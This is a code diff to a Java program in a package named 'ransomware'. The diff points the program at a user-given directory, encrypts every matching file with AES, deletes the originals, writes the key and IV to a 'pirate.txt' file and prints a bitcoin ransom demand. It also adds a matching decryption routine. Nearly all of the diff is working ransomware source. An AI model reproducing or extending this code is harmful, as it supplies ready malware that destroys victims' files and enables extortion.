@@ -7,6 +7,7 @@ package ransomware;
 import commandLineArgsParser.*;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
@@ -66,16 +67,15 @@ public class main {
             return;
         }
 
-        String[] FileTypesArray = cmd.getOptionValues("type");
-        System.out.println(FileTypesArray[0]);    
+        String[] FileTypesArray = cmd.getOptionValues("type");   
         String InputDirectory  = cmd.getOptionValue("directory");
         String DecryptionInfoPath  = cmd.getOptionValue("decryption");
         
         if (DecryptionInfoPath == null)
         {
             IvParameterSpec IV = generateIV();
-            SecretKey DecryptionKey = generateKey();
-            Path path = Paths.get("/root/Desktop/cryptme");
+            SecretKey EncryptionKey = generateKey();
+            Path path = Paths.get(InputDirectory);
             
             List<String> files = new ArrayList<String>();
             List<String> FilesToEncrypt = new ArrayList<String>();
@@ -97,7 +97,7 @@ public class main {
             {
                 Path FilePath = Paths.get(FilesToEncrypt.get(i));
                 byte[] FileData = Files.readAllBytes(FilePath);
-                doEncryption(FileData, DecryptionKey, IV, FilePath.toString() + ".enc");
+                doEncryption(FileData, EncryptionKey, IV, FilePath.toString() + ".enc");
                 
                 File file = new File(FilePath.toString());
                 file.delete();
@@ -106,16 +106,37 @@ public class main {
                 fileB.renameTo(file);
             }
             
-            Path pathdec = Paths.get("/root/Desktop/TP1.pdfenc");
-            byte[] FileDataDec = Files.readAllBytes(pathdec);
-            doDecryption(FileDataDec, DecryptionKey, IV, pathdec.toString());
+            byte[] KeyBytes = EncryptionKey.getEncoded();
+            byte[] IVBytes = IV.getIV();
+            String KeyData = Base64.getEncoder().encodeToString(EncryptionKey.getEncoded());
+            String IVData = Base64.getEncoder().encodeToString(IVBytes);
+            
+            FileWriter writefile = new FileWriter(InputDirectory + "/pirate.txt", true);
+            writefile.write(IVData);
+            writefile.write("\n");
+            writefile.write(KeyData);
+            writefile.close();
+            
+            System.out.println("This computer has been compromised, some of your files have been encrypted. You must pay $20cad in bitcoins to [bitcoin wallet] for unlock your files.");
         }
         else
         {
             Path path = Paths.get(DecryptionInfoPath);
             
+            String sDecryptionIV = Files.readAllLines(path).get(0);
+            String sDecryptionKey = Files.readAllLines(path).get(1);
+            
+            byte[] IVBytes = Base64.getDecoder().decode(sDecryptionIV);
+            IvParameterSpec IV = new IvParameterSpec(IVBytes);
+            
+            byte[] KeyBytes = Base64.getDecoder().decode(sDecryptionKey);
+            SecretKey DecryptionKey = new SecretKeySpec(KeyBytes, 0, KeyBytes.length, "AES");
+            
             List<String> files = new ArrayList<String>();
             List<String> FilesToDecrypt = new ArrayList<String>();
+            
+            String DecryptionPath = InputDirectory;
+            path = Paths.get(DecryptionPath);
             
             Files.walk(path).forEach(filepath -> files.add(filepath.toString()));
             
@@ -134,13 +155,13 @@ public class main {
             {
                 Path FilePath = Paths.get(FilesToDecrypt.get(i));
                 byte[] FileData = Files.readAllBytes(FilePath);
-                //doEncryption(FileData, DecryptionKey, IV, FilePath.toString() + ".enc");
+                doEncryption(FileData, DecryptionKey, IV, FilePath.toString() + ".dec");
                 
-                //File file = new File(FilePath.toString());
-                //file.delete();
+                File file = new File(FilePath.toString());
+                file.delete();
                 
-                //File fileB = new File(FilePath.toString() + ".enc");
-                //fileB.renameTo(file);
+                File fileB = new File(FilePath.toString() + ".dec");
+                fileB.renameTo(file);
             }
         }
     }
@@ -196,7 +217,6 @@ public class main {
         byte[] iv0 = random.generateSeed(16);
         IvParameterSpec iv = new IvParameterSpec(iv0);
         return iv;
-        //return Base64.getEncoder().encodeToString(iv0);
     }
     
     public static SecretKey generateKey() throws NoSuchAlgorithmException
@@ -205,8 +225,6 @@ public class main {
 	keyGenerator.init(128);
 	SecretKey DecryptionKey = keyGenerator.generateKey();
         return DecryptionKey;
-        
-        //return Base64.getEncoder().encodeToString(DecryptionKey.getEncoded());
     }
     
 }
